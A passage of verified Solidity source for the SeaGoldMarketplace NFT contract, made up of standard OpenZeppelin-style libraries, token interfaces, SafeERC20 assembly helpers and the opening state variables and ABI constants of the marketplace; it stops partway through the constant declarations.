/**
 *Submitted for verification at Etherscan.io on 2023-03-04
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-28
 */

// SPDX-License-Identifier: NO LICENSE

pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function withdraw(uint256 wad) external payable;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Implementation of the {IERC165} interface.
 *
 * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
 * for the additional interface id that will be supported. For example:
 *
 * ```solidity
 * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
 *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
 * }
 * ```
 *
 * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

/**
 * @dev Required interface of an ERC721 compliant contract.
 */
interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 indexed tokenId
    );

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(
        address indexed owner,
        address indexed approved,
        uint256 indexed tokenId
    );

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(
        address indexed owner,
        address indexed operator,
        bool approved
    );

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId)
        external
        view
        returns (address operator);

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator)
        external
        view
        returns (bool);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
}

/**
 * @dev Required interface of an ERC1155 compliant contract, as defined in the
 * https://eips.ethereum.org/EIPS/eip-1155[EIP].
 *
 * _Available since v3.1._
 */
interface IERC1155 is IERC165 {
    /**
     * @dev Emitted when `value` tokens of token type `id` are transferred from `from` to `to` by `operator`.
     */
    event TransferSingle(
        address indexed operator,
        address indexed from,
        address indexed to,
        uint256 id,
        uint256 value
    );

    /**
     * @dev Equivalent to multiple {TransferSingle} events, where `operator`, `from` and `to` are the same for all
     * transfers.
     */
    event TransferBatch(
        address indexed operator,
        address indexed from,
        address indexed to,
        uint256[] ids,
        uint256[] values
    );

    /**
     * @dev Emitted when `account` grants or revokes permission to `operator` to transfer their tokens, according to
     * `approved`.
     */
    event ApprovalForAll(
        address indexed account,
        address indexed operator,
        bool approved
    );

    /**
     * @dev Emitted when the URI for token type `id` changes to `value`, if it is a non-programmatic URI.
     *
     * If an {URI} event was emitted for `id`, the standard
     * https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[guarantees] that `value` will equal the value
     * returned by {IERC1155MetadataURI-uri}.
     */
    event URI(string value, uint256 indexed id);

    /**
     * @dev Returns the amount of tokens of token type `id` owned by `account`.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function balanceOf(address account, uint256 id)
        external
        view
        returns (uint256);

    /**
     * @dev xref:ROOT:ERC1155.adoc#batch-operations[Batched] version of {balanceOf}.
     *
     * Requirements:
     *
     * - `accounts` and `ids` must have the same length.
     */
    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)
        external
        view
        returns (uint256[] memory);

    /**
     * @dev Grants or revokes permission to `operator` to transfer the caller's tokens, according to `approved`,
     *
     * Emits an {ApprovalForAll} event.
     *
     * Requirements:
     *
     * - `operator` cannot be the caller.
     */
    function setApprovalForAll(address operator, bool approved) external;

    /**
     * @dev Returns true if `operator` is approved to transfer ``account``'s tokens.
     *
     * See {setApprovalForAll}.
     */
    function isApprovedForAll(address account, address operator)
        external
        view
        returns (bool);

    /**
     * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.
     *
     * Emits a {TransferSingle} event.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - If the caller is not `from`, it must be have been approved to spend ``from``'s tokens via {setApprovalForAll}.
     * - `from` must have a balance of tokens of type `id` of at least `amount`.
     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the
     * acceptance magic value.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) external;

    /**
     * @dev xref:ROOT:ERC1155.adoc#batch-operations[Batched] version of {safeTransferFrom}.
     *
     * Emits a {TransferBatch} event.
     *
     * Requirements:
     *
     * - `ids` and `amounts` must have the same length.
     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the
     * acceptance magic value.
     */
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;
}

interface RewardCalc {
    function getRewardsBL(uint256 _amount)
        external
        pure
        returns (uint256 sellerRewards, uint256 buyerRewards);

    function getRewardsAL(uint256 _amount)
        external
        view
        returns (uint256 sellerRewards, uint256 buyerRewards);
}

interface RoyaltyRegistry {
    function getRoyaltyInfo(address _contractAddress)
        external
        view
        returns (
            bool,
            address,
            uint256,
            bool
        );
}

abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(
            _initializing || !_initialized,
            "Initializable: contract is already initialized"
        );

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }
}

abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal initializer {
        __Context_init_unchained();
    }

    function __Context_init_unchained() internal initializer {}

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }

    uint256[50] private __gap;
}

abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address public _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal initializer {
        __Context_init_unchained();
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal initializer {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    uint256[49] private __gap;
}

interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

interface IDaiLikePermit {
    function permit(
        address holder,
        address spender,
        uint256 nonce,
        uint256 expiry,
        bool allowed,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

library RevertReasonForwarder {
    function reRevert() internal pure {
        // bubble up revert reason from latest external call
        /// @solidity memory-safe-assembly
        assembly {
            // solhint-disable-line no-inline-assembly
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, returndatasize())
            revert(ptr, returndatasize())
        }
    }
}

library SafeERC20 {
    error SafeTransferFailed();
    error SafeTransferFromFailed();
    error ForceApproveFailed();
    error SafeIncreaseAllowanceFailed();
    error SafeDecreaseAllowanceFailed();
    error SafePermitBadLength();

    // Ensures method do not revert or return boolean `true`, admits call to non-smart-contract
    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 amount
    ) internal {
        bytes4 selector = token.transferFrom.selector;
        bool success;
        /// @solidity memory-safe-assembly
        assembly {
            // solhint-disable-line no-inline-assembly
            let data := mload(0x40)

            mstore(data, selector)
            mstore(add(data, 0x04), from)
            mstore(add(data, 0x24), to)
            mstore(add(data, 0x44), amount)
            success := call(gas(), token, 0, data, 100, 0x0, 0x20)
            if success {
                switch returndatasize()
                case 0 {
                    success := gt(extcodesize(token), 0)
                }
                default {
                    success := and(gt(returndatasize(), 31), eq(mload(0), 1))
                }
            }
        }
        if (!success) revert SafeTransferFromFailed();
    }

    function safeTransferFrom721(
        IERC20 token,
        address from,
        address to,
        uint256 tokenId
    ) internal {
        bytes4 selector = token.transferFrom.selector;
        bool success;
        /// @solidity memory-safe-assembly
        assembly {
            // solhint-disable-line no-inline-assembly
            let data := mload(0x40)

            mstore(data, selector)
            mstore(add(data, 0x04), from)
            mstore(add(data, 0x24), to)
            mstore(add(data, 0x44), tokenId)
            success := call(gas(), token, 0, data, 100, 0x0, 0x20)
            if success {
                switch returndatasize()
                case 0 {
                    success := gt(extcodesize(token), 0)
                }
                default {
                    success := and(gt(returndatasize(), 31), eq(mload(0), 1))
                }
            }
        }
        if (!success) revert SafeTransferFromFailed();
    }

    // Ensures method do not revert or return boolean `true`, admits call to non-smart-contract
    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        if (!_makeCall(token, token.transfer.selector, to, value)) {
            revert SafeTransferFailed();
        }
    }

    // If `approve(from, to, amount)` fails, try to `approve(from, to, 0)` before retry
    function forceApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        if (!_makeCall(token, token.approve.selector, spender, value)) {
            if (
                !_makeCall(token, token.approve.selector, spender, 0) ||
                !_makeCall(token, token.approve.selector, spender, value)
            ) {
                revert ForceApproveFailed();
            }
        }
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 allowance = token.allowance(address(this), spender);
        if (value > type(uint256).max - allowance)
            revert SafeIncreaseAllowanceFailed();
        forceApprove(token, spender, allowance + value);
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 allowance = token.allowance(address(this), spender);
        if (value > allowance) revert SafeDecreaseAllowanceFailed();
        forceApprove(token, spender, allowance - value);
    }

    function safePermit(IERC20 token, bytes calldata permit) internal {
        bool success;
        if (permit.length == 32 * 7) {
            success = _makeCalldataCall(
                token,
                IERC20Permit.permit.selector,
                permit
            );
        } else if (permit.length == 32 * 8) {
            success = _makeCalldataCall(
                token,
                IDaiLikePermit.permit.selector,
                permit
            );
        } else {
            revert SafePermitBadLength();
        }
        if (!success) RevertReasonForwarder.reRevert();
    }

    function _makeCall(
        IERC20 token,
        bytes4 selector,
        address to,
        uint256 amount
    ) private returns (bool success) {
        /// @solidity memory-safe-assembly
        assembly {
            // solhint-disable-line no-inline-assembly
            let data := mload(0x40)

            mstore(data, selector)
            mstore(add(data, 0x04), to)
            mstore(add(data, 0x24), amount)
            success := call(gas(), token, 0, data, 0x44, 0x0, 0x20)
            if success {
                switch returndatasize()
                case 0 {
                    success := gt(extcodesize(token), 0)
                }
                default {
                    success := and(gt(returndatasize(), 31), eq(mload(0), 1))
                }
            }
        }
    }

    function _makeCalldataCall(
        IERC20 token,
        bytes4 selector,
        bytes calldata args
    ) private returns (bool success) {
        /// @solidity memory-safe-assembly
        assembly {
            // solhint-disable-line no-inline-assembly
            let len := add(4, args.length)
            let data := mload(0x40)

            mstore(data, selector)
            calldatacopy(add(data, 0x04), args.offset, args.length)
            success := call(gas(), token, 0, data, len, 0x0, 0x20)
            if success {
                switch returndatasize()
                case 0 {
                    success := gt(extcodesize(token), 0)
                }
                default {
                    success := and(gt(returndatasize(), 31), eq(mload(0), 1))
                }
            }
        }
    }
}

contract SeaGoldMarketplace is ContextUpgradeable, OwnableUpgradeable {
    using SafeMath for uint256;

    using SafeERC20 for IERC20;

    address public SeaGoldToken;
    address public WETHtoken;
    address public royaltyRegistry;
    address public FeeAddress;
    address public StakingAddress;
    address public RewardCalcAddress;
    bool public SeaGoldLaunched;
    bool public MarketOpen;
    IERC20 public seagoldtoken;

    uint256 internal constant MASK_160 = (1 << 160) - 1;
    uint256 constant AlmostOneWord = 0x1f;
    uint256 constant OneWord = 0x20;
    uint256 constant TwoWords = 0x40;
    uint256 constant ThreeWords = 0x60;

    uint256 constant FreeMemoryPointerSlot = 0x40;
    uint256 constant ZeroSlot = 0x60;
    uint256 constant DefaultFreeMemoryPointer = 0x80;

    uint256 constant Slot0x80 = 0x80;
    uint256 constant Slot0xA0 = 0xa0;
    uint256 constant Slot0xC0 = 0xc0;

    // abi.encodeWithSignature("transferFrom(address,address,uint256)")
    uint256 constant ERC20_transferFrom_signature = (
        0x23b872dd00000000000000000000000000000000000000000000000000000000
    );
    uint256 constant ERC20_transferFrom_sig_ptr = 0x0;
    uint256 constant ERC20_transferFrom_from_ptr = 0x04;
    uint256 constant ERC20_transferFrom_to_ptr = 0x24;
    uint256 constant ERC20_transferFrom_amount_ptr = 0x44;
    uint256 constant ERC20_transferFrom_length = 0x64; // 4 + 32 * 3 == 100

    // abi.encodeWithSignature(
    //     "safeTransferFrom(address,address,uint256,uint256,bytes)"
    // )
    uint256 constant ERC1155_safeTransferFrom_signature = (
        0xf242432a00000000000000000000000000000000000000000000000000000000
    );
    uint256 constant ERC1155_safeTransferFrom_sig_ptr = 0x0;
    uint256 constant ERC1155_safeTransferFrom_from_ptr = 0x04;
    uint256 constant ERC1155_safeTransferFrom_to_ptr = 0x24;
    uint256 constant ERC1155_safeTransferFrom_id_ptr = 0x44;
    uint256 constant ERC1155_safeTransferFrom_amount_ptr = 0x64;
    uint256 constant ERC1155_safeTransferFrom_data_offset_ptr = 0x84;
    uint256 constant ERC1155_safeTransferFrom_data_length_ptr = 0xa4;
    uint256 constant ERC1155_safeTransferFrom_length = 0xc4; // 4 + 32 * 6 == 196
    uint256 constant ERC1155_safeTransferFrom_data_length_offset = 0xa0;

    // abi.encodeWithSignature(
    //     "safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)"
    // )
    uint256 constant ERC1155_safeBatchTransferFrom_signature = (
        0x2eb2c2d600000000000000000000000000000000000000000000000000000000
    );

    bytes4 constant ERC1155_safeBatchTransferFrom_selector =
        bytes4(bytes32(ERC1155_safeBatchTransferFrom_signature));

    uint256 constant ERC721_transferFrom_signature =
        ERC20_transferFrom_signature;
    uint256 constant ERC721_transferFrom_sig_ptr = 0x0;
    uint256 constant ERC721_transferFrom_from_ptr = 0x04;
    uint256 constant ERC721_transferFrom_to_ptr = 0x24;
    uint256 constant ERC721_transferFrom_id_ptr = 0x44;
    uint256 constant ERC721_transferFrom_length = 0x64; // 4 + 32 * 3 == 100

    // abi.encodeWithSignature("NoContract(address)")
    uint256 constant NoContract_error_signature = (
        0x5f15d67200000000000000000000000000000000000000000000000000000000
    );
    uint256 constant NoContract_error_sig_ptr = 0x0;
    uint256 constant NoContract_error_token_ptr = 0x4;
    uint256 constant NoContract_error_length = 0x24; // 4 + 32 == 36

    // abi.encodeWithSignature(
    //     "TokenTransferGenericFailure(address,address,address,uint256,uint256)"
    // )
    uint256 constant TokenTransferGenericFailure_error_signature = (
        0xf486bc8700000000000000000000000000000000000000000000000000000000
    );
    uint256 constant TokenTransferGenericFailure_error_sig_ptr = 0x0;
    uint256 constant TokenTransferGenericFailure_error_token_ptr = 0x4;
    uint256 constant TokenTransferGenericFailure_error_from_ptr = 0x24;
    uint256 constant TokenTransferGenericFailure_error_to_ptr = 0x44;
    uint256 constant TokenTransferGenericFailure_error_id_ptr = 0x64;
    uint256 constant TokenTransferGenericFailure_error_amount_ptr = 0x84;

    // 4 + 32 * 5 == 164
    uint256 constant TokenTransferGenericFailure_error_length = 0xa4;

    // abi.encodeWithSignature(
    //     "BadReturnValueFromERC20OnTransfer(address,address,address,uint256)"
    // )
    uint256 constant BadReturnValueFromERC20OnTransfer_error_signature = (
        0x9889192300000000000000000000000000000000000000000000000000000000
    );
    uint256 constant BadReturnValueFromERC20OnTransfer_error_sig_ptr = 0x0;
    uint256 constant BadReturnValueFromERC20OnTransfer_error_token_ptr = 0x4;
    uint256 constant BadReturnValueFromERC20OnTransfer_error_from_ptr = 0x24;
    uint256 constant BadReturnValueFromERC20OnTransfer_error_to_ptr = 0x44;
    uint256 constant BadReturnValueFromERC20OnTransfer_error_amount_ptr = 0x64;

    // 4 + 32 * 4 == 132
    uint256 constant BadReturnValueFromERC20OnTransfer_error_length = 0x84;

    uint256 constant ExtraGasBuffer = 0x20;
    uint256 constant CostPerWord = 3;
    uint256 constant MemoryExpansionCoefficient = 0x200;

    // Values are offset by 32 bytes in order to write the token to the beginning
    // in the event of a revert
    uint256 constant BatchTransfer1155Params_ptr = 0x24;
